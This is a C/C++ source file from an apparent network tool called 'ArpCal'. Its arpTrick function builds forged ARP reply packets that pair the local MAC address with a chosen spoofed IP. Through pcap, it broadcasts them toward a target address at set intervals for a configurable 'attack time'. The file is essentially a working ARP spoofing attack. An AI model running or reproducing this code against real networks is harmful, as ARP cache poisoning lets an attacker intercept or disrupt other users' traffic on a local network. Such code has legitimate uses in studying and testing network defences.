#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include <sys/select.h>
/*include <pcap.h> instead of including <pcap/
  pcap.h> for backwards compatibility      */
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#ifdef HAVE_SYS_SOCKIO_H
    #include <sys/sockio.h>
#endif
#include <unistd.h>
#include <iostream>
#include "arp-trick.h"
#include "parse-options.h"
#include "arp-list.h"
#include "o_funcs.h"
#include "encap_pcap.h"
#include "output_format.h"
using namespace std;

typedef unsigned char byte;

#define ETHER_ADDR_LEN 6
#define IPV4_ADDR_LEN 4

static void sleep_ms(unsigned int secs)
{
    struct timeval tval;
    tval.tv_sec=secs/1000;
    tval.tv_usec=(secs*1000)%1000000;
    select(0,NULL,NULL,NULL,&tval);
}

struct arpPacket
{
    /* Ether header. */
    byte ether_dhost[6];
    byte ether_shost[6];
    byte type[2];
    /* Arp field .   */
    byte arp_hwtype[2];
    byte arp_pro[2];
    byte arp_hlen[1];
    byte arp_plen[1];
    byte arp_op[2];
    byte arp_sha[6];
    byte arp_spa[4];
    byte arp_tha[6];
    byte arp_tpa[4];
};

/* Get mac address by name and return an array of 
   byte. The size of the array is ETHER_ADDR_LEN. 
   Remember to free the memory returned.        
   If device does not have address(such as pseudo 
   device.), return a byte array consist of 0.  */
byte* get_mac_address(char* deviceName)
{
    ifreq ifr;
    int skfd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, deviceName, 16/*IFNameSzie*/);
    if (ioctl(skfd, SIOCGIFHWADDR, &ifr) < 0)//failed.
    {
	//output_error_msg_and_exit("error in ioctl with cmd SIOCGIFHWADDR.",0);
    }
    close(skfd);
    byte *macAddr = (byte*)malloc(6*sizeof(byte));
    memcpy(macAddr,ifr.ifr_hwaddr.sa_data,ETHER_ADDR_LEN);
    return macAddr;
}

void print_macAddr(byte* macAddr)
{
    printf("macAddr");
    for(int i=0;i<6;i++)
    {
	printf("%02x",(byte)macAddr[i]);
    }
}

void print_ipv4Addr(byte* ipv4Addr)
{
    printf("ipv4Addr");
    for(int i=0;i<4;i++)
    {
	printf("%02x",(byte)ipv4Addr[i]);
    }
}

/* TODO: still not completed. */
int check_timeUnit_and_calculate_totalTime(int attackTime,const char* timeUnit)
{
    int totalTime=0;
    if(!strcmp(timeUnit,"second")||!strcmp(timeUnit,"seconds"))
    {
	totalTime = attackTime;
    }
    else if(!strcmp(timeUnit,"minute")||!strcmp(timeUnit,"minutes"))
    {
	totalTime = attackTime*60;
    }
    else if(!strcmp(timeUnit,"hour")||!strcmp(timeUnit,"hour"))
    {
	totalTime = attackTime*3600;
    }
    else
    {
	const char* errMsg= "timeUnit error.\ttimeUnit={second[s]|minute[s]|hour[s]}\tsee ArpCal --help";
	//TODO:errorCode
	output_error_msg_and_exit(errMsg,0);
    }
    return totalTime;
}

void set_ether_header_for_packet(arpPacket* packet,byte* dstMacAddr,byte* srcMacAddr)
{
    memcpy(packet->ether_dhost,dstMacAddr,ETHER_ADDR_LEN);
    memcpy(packet->ether_shost,srcMacAddr,ETHER_ADDR_LEN);
    packet->type[0]=0x08;
    packet->type[1]=0x06;
}

byte* ipv4String_to_byteArray_with_validity_check(char* ipAddr)
{
    if(is_IPAddress_valid(ipAddr))
    {
	byte* ip = (byte*)malloc(IPV4_ADDR_LEN*sizeof(byte));
	const char* split = "."; 
	char* p;
	p = strtok (ipAddr,split);
	int tag=0;
	ip[tag]=atoi(p);
	tag++;
	while(p!=NULL)
	{
	    p=strtok(NULL,split);
	    if(p!=NULL)
		{
		    ip[tag]=atoi(p);
		}
	    tag++;
	}
	return ip;
    }
    else
    {
	//TODO:errorCode
	output_error_msg_and_exit("ip address format error. [xx.xx.xx.xx]",0);
    }
}

//void arpTrick(int argc,char *argv[]);
void arpTrick(char* ipAddr,char* spoofingIP,int attackTime,const char* timeUnit,int intervalTime)
{
    char errBuf[PCAP_ERRBUF_SIZE];
    char * deviceName;

    /* Total packets sent. */
    int totalPackets =0;
    
    /* Check the validity of timeUnit & calculate totaltime. */ 
    int totalTime = check_timeUnit_and_calculate_totalTime(attackTime,timeUnit);

    /* Packet to sent. */
    arpPacket *packet = (arpPacket*)malloc(sizeof(arpPacket));

    /* Looking for suitable device. */
    deviceName = pcap_lookupdev_with_prompts(errBuf);
    //if(!if_device_has_address(deviceName))
    //{
	//TODO: if it can send packet if a device do not have a mac?
	//output_error_msg_and_exit("Do not have any suitable device.",0);
    //}

    /* Set ether header. */
    byte dstMacAddr[ETHER_ADDR_LEN]={0xff,0xff,0xff,0xff,0xff,0xff};
    byte* srcMacAddr = get_mac_address(deviceName);
    set_ether_header_for_packet(packet,dstMacAddr,srcMacAddr);
    free(srcMacAddr);

    /* Set hardware type for packet. */
    packet->arp_hwtype[0]=0x00;
    packet->arp_hwtype[1]=0x01;

    /* Set protocol type for packet. */
    packet->arp_pro[0]=0x08;
    packet->arp_pro[1]=0x00;
    /* Set hardware length for packet. */
    packet->arp_hlen[0]=0x06;
    /* Set protocol addr length. */
    packet->arp_plen[0]=0x04;
    /* Set op code. */
    packet->arp_op[0]=0x00;
    packet->arp_op[1]=0x02;

    /* Set source mac for packet. */
    byte* sha = get_mac_address(deviceName);
    memcpy(packet->arp_sha,sha,ETHER_ADDR_LEN);
    free(sha);

    /* Set source ip address for packet. */
    byte* sourceIP = ipv4String_to_byteArray_with_validity_check(spoofingIP);
    memcpy(packet->arp_spa,sourceIP,IPV4_ADDR_LEN);
    free(sourceIP);

    /* Do not need to set target mac, let it be 0. */

    /* Set target ip address for packet. */
    byte* targetIP = ipv4String_to_byteArray_with_validity_check(ipAddr);
    memcpy(packet->arp_tpa,targetIP,IPV4_ADDR_LEN);
    free(targetIP);

    /*open the device by name*/
    //pcap_t *fp = pcap_open_live_with_prompts();
    output_info("Opening the device...");
    pcap_t *fp;
    if((fp=pcap_open_live(
	deviceName,        /*device name*/
	100,               /*portion of the packet to capture*/
	1,
	1000,
	errBuf
	))==NULL)
    {
	output_error_msg_and_exit("error. unable to open the adaper.",0);
	cout<<errBuf<<endl;
	cout<<"try sudo ArpCal [-a]."<<endl;
	return;
    }
    open_color(green);
    cout<<"done."<<endl;
    close_color();
    output_info_line("Packet content are as follows");
    open_color(yellow);
    byte* p;
    p = (unsigned char*)packet;
    
    print_arp_packet(p);
    close_color();

    if(!pcap_sendpacket(fp,p,42/*size*/))
    {
	output_info_line("Start senting down packet.");
    }
    else
    {
	fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
	return;
    }

    const time_t start_time = time(NULL); /*get start time*/
    
    while(true)
    {
	sleep_ms(intervalTime);
	//TODO: p=packet
	pcap_sendpacket(fp,p,42/*size*/);
	totalPackets++;
	const time_t mid_time = time(NULL);
	cout<<dec<<totalTime-(mid_time-start_time)<<" "<<flush;/*Flush output buffer.*/
	cout<<"\b\b\b\b";
	if(mid_time-start_time>=totalTime)
	    break;
    }

    const time_t end_time = time(NULL);   /*get end time*/
    /*Close the device*/
    pcap_close(fp);
    output_info_line("Work done, closing the devcie...done.");
    output_info_header();
    open_color(green);
    cout<<totalPackets<<" packets have been sent in "<<end_time-start_time<<" "<<timeUnit<<". ";
    cout<<"Average:"<<(float)totalPackets/totalTime<<" packets per second."<<endl;
    close_color();
}
